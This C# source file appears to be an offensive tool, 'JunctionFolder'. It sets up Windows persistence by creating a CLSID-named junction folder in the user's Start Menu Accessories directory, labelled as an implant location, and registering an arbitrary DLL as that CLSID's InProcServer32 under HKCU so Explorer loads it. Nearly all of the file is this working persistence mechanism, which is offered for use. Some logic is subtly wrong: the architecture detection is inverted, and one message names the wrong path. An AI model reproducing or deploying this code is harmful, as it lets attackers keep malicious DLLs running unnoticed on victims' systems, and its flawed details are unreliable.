using Microsoft.Win32;
using System;
using System.IO;

namespace JunctionFolder
{
    class Program
    {
        public static MachineType GetDllMachineType(string dllPath)
        {
            FileStream fs = new FileStream(dllPath, FileMode.Open, FileAccess.Read);
            BinaryReader br = new BinaryReader(fs);
            fs.Seek(0x3c, SeekOrigin.Begin); //Offset to PE header
            int peOffset = br.ReadInt32();
            fs.Seek(peOffset, SeekOrigin.Begin);
            uint peHead = br.ReadUInt32();
            if (peHead != 0x00004550) //MZ
                throw new Exception("[-] Provided file does not appear to be PECOFF");
            MachineType machineType = (MachineType)br.ReadUInt16();
            br.Close();
            fs.Close();
            return machineType;
        }

        //Only supporting x86 and x64
        public enum MachineType : ushort
        {
            IMAGE_FILE_MACHINE_AMD64 = 0x8664,
            IMAGE_FILE_MACHINE_I386 = 0x14c,
            IMAGE_FILE_MACHINE_IA64 = 0x200,
        }

        public static string osArch = null;
        public static string guid = "{" + Convert.ToString(Guid.NewGuid()).ToUpper() + "}";

        static void Main(string[] args)
        {
            //string b64Dll = "TVqQ...";
            //byte[] dllBytes = Convert.FromBase64String(b64Dll);
            //File.WriteAllBytes(@"C:\temp\mydll.dll",)

            if (args.Length != 1)
            {
                Console.WriteLine("[-] Usage: JunctionFolder.exe <full path to DLL>");
                Environment.Exit(1);
            }
            if (!File.Exists(args[0]))
            {
                Console.WriteLine("[-] DLL does not appear to exist on the system. Did you provide the full path?");
                Environment.Exit(1);
            }

            if (!string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")))
            {
                Console.WriteLine("[+] Detected x86 system architecture.");
                osArch = "x86";
            }
            else
            {
                Console.WriteLine("[+] Detected x64 system architecture.");
                osArch = "x64";
            }

            MachineType type = GetDllMachineType(args[0]);
            string dllArch = null;
            if (type.Equals(MachineType.IMAGE_FILE_MACHINE_I386))
            {
                Console.WriteLine("[+] Detected DLL x86 DLL architecture");
                dllArch = "x86";
            }
            else if (type.Equals(MachineType.IMAGE_FILE_MACHINE_IA64) || type.Equals(MachineType.IMAGE_FILE_MACHINE_AMD64))
            {
                Console.WriteLine("[+] Detected DLL x64 DLL architecture");
                dllArch = "x64";
            }
            if (!dllArch.Equals(osArch))
            {
                Console.WriteLine("[-] Detected architecture mismatch. Make sure your DLL architecture matches the host's.");
                Environment.Exit(1);
            }

            //Create the junction folder
            string implantDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Start Menu\Programs\Accessories\");
            string target = implantDir + "Indexing." + guid;
            try
            {
                Directory.CreateDirectory(target);
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Unable to create the junction folder");
                Console.WriteLine(e);
                Environment.Exit(1);
            }
            Console.WriteLine("[+] Created junction folder at %APPDATA%/Indexing." + guid);

            //Set up the registry key
            string dllPath = args[0];
            string key = @"SOFTWARE\Classes\CLSID\" + guid + @"\InProcServer32";
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey(key);
            try
            {
                regkey.SetValue("", dllPath);
                regkey.Close();

            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Could not write the registry key");
                Console.WriteLine(e);
                Environment.Exit(1);
            }
            Console.WriteLine("[+] Registry key written");
        }
    }
}
